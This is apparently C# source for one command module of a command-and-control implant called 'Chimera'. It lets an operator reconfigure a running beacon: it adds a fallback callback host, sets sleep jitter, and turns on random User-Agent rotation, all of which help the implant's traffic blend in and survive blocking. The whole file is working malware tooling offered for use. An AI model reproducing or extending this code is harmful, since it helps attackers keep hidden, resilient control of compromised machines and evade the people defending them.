using System;

namespace Chimera.Commands
{
    // c2config — operator-triggered runtime tuning of beacon behaviour.
    // All changes take effect immediately; they persist until the process exits
    // (no recompile needed). State lives in C2Http static fields.
    //
    // Subcommands:
    //   c2config secondary_url <url>    — add fallback callback host
    //   c2config secondary_url clear    — remove secondary URL
    //   c2config jitter <base> <range>  — sleep = base ± range (seconds)
    //   c2config jitter reset           — restore default jitter from Config.*
    //   c2config ua_rotate on           — random UA from pool each request
    //   c2config ua_rotate off          — static UA (default)
    //   c2config status                 — show current C2 config
    public static class C2Config
    {
        public static string Execute(string parameters)
        {
            if (string.IsNullOrEmpty(parameters))
                return Usage();

            string[] parts = parameters.Trim().Split(
                new char[]{' '}, StringSplitOptions.RemoveEmptyEntries);

            string sub = parts[0].ToLower();

            switch (sub)
            {
                case "secondary_url":
                    return SetSecondaryUrl(parts);

                case "jitter":
                    return SetJitter(parts);

                case "ua_rotate":
                    return SetUaRotate(parts);

                case "status":
                    return GetStatus();

                default:
                    return Usage();
            }
        }

        // ----------------------------------------------------------------
        // secondary_url
        // ----------------------------------------------------------------
        private static string SetSecondaryUrl(string[] parts)
        {
            if (parts.Length < 2)
                return "[usage] c2config secondary_url <url|clear>";

            string val = parts[1];
            if (val.ToLower() == "clear")
            {
                C2Http.SecondaryURL = "";
                return "[+] Secondary URL cleared. Agent will only use primary.";
            }

            // Basic sanity check — must look like a URL
            if (!val.StartsWith("http://") && !val.StartsWith("https://"))
                return "[error] URL must start with http:// or https://";

            C2Http.SecondaryURL = val;
            return "[+] Secondary URL set: " + val +
                   "\n[*] Agent randomly alternates primary and secondary on each check-in " +
                   "when primary fails.";
        }

        // ----------------------------------------------------------------
        // jitter
        // ----------------------------------------------------------------
        private static string SetJitter(string[] parts)
        {
            if (parts.Length < 2)
                return "[usage] c2config jitter <base_seconds> <range_seconds>  |  jitter reset";

            if (parts[1].ToLower() == "reset")
            {
                C2Http.JitterBase  = -1;
                C2Http.JitterRange = -1;
                return "[+] Jitter reset to defaults: " +
                       Config.SleepInterval + "s ± " + Config.Jitter + "%.";
            }

            if (parts.Length < 3)
                return "[usage] c2config jitter <base_seconds> <range_seconds>";

            int baseVal, rangeVal;
            if (!int.TryParse(parts[1], out baseVal) || baseVal < 1)
                return "[error] base must be a positive integer (seconds).";
            if (!int.TryParse(parts[2], out rangeVal) || rangeVal < 0)
                return "[error] range must be a non-negative integer (seconds).";
            if (rangeVal >= baseVal)
                return "[error] range must be less than base to avoid zero/negative sleep.";

            C2Http.JitterBase  = baseVal;
            C2Http.JitterRange = rangeVal * 100 / baseVal; // convert to % internally

            return "[+] Jitter set: " + baseVal + "s ± " + rangeVal + "s" +
                   "  (effective %" + C2Http.JitterRange + " of base)";
        }

        // ----------------------------------------------------------------
        // ua_rotate
        // ----------------------------------------------------------------
        private static string SetUaRotate(string[] parts)
        {
            if (parts.Length < 2)
                return "[usage] c2config ua_rotate on|off";

            switch (parts[1].ToLower())
            {
                case "on":
                    C2Http.UaRotate = true;
                    var sb = new System.Text.StringBuilder();
                    sb.AppendLine("[+] UA rotation enabled. Pool:");
                    foreach (string ua in C2Http.UaPool)
                        sb.AppendLine("    " + ua);
                    return sb.ToString();

                case "off":
                    C2Http.UaRotate = false;
                    return "[+] UA rotation disabled. Using static UA: " + Config.UserAgent;

                default:
                    return "[usage] c2config ua_rotate on|off";
            }
        }

        // ----------------------------------------------------------------
        // status
        // ----------------------------------------------------------------
        private static string GetStatus()
        {
            var sb = new System.Text.StringBuilder();
            sb.AppendLine("=== C2 Configuration ===");
            sb.AppendLine("Primary URL  : " + Config.CallbackURL);

            string sec = C2Http.SecondaryURL;
            sb.AppendLine("Secondary URL: " +
                (string.IsNullOrEmpty(sec) ? "(none)" : sec));

            if (C2Http.JitterBase >= 0)
                sb.AppendLine("Jitter       : " + C2Http.JitterBase + "s base, " +
                              C2Http.JitterRange + "% range (runtime override)");
            else
                sb.AppendLine("Jitter       : " + Config.SleepInterval + "s, " +
                              Config.Jitter + "% (config default)");

            sb.AppendLine("UA Rotation  : " + (C2Http.UaRotate ? "ON" : "OFF"));
            if (!C2Http.UaRotate)
                sb.AppendLine("User-Agent   : " + Config.UserAgent);
            else
            {
                sb.AppendLine("UA Pool size : " + C2Http.UaPool.Length);
            }
            return sb.ToString();
        }

        private static string Usage()
        {
            return
                "c2config secondary_url <url>    — add fallback callback host\n" +
                "c2config secondary_url clear    — remove secondary URL\n" +
                "c2config jitter <base> <range>  — sleep = base±range seconds\n" +
                "c2config jitter reset           — restore compiled-in defaults\n" +
                "c2config ua_rotate on           — random UA each check-in\n" +
                "c2config ua_rotate off          — static UA\n" +
                "c2config status                 — show current C2 settings";
        }
    }
}
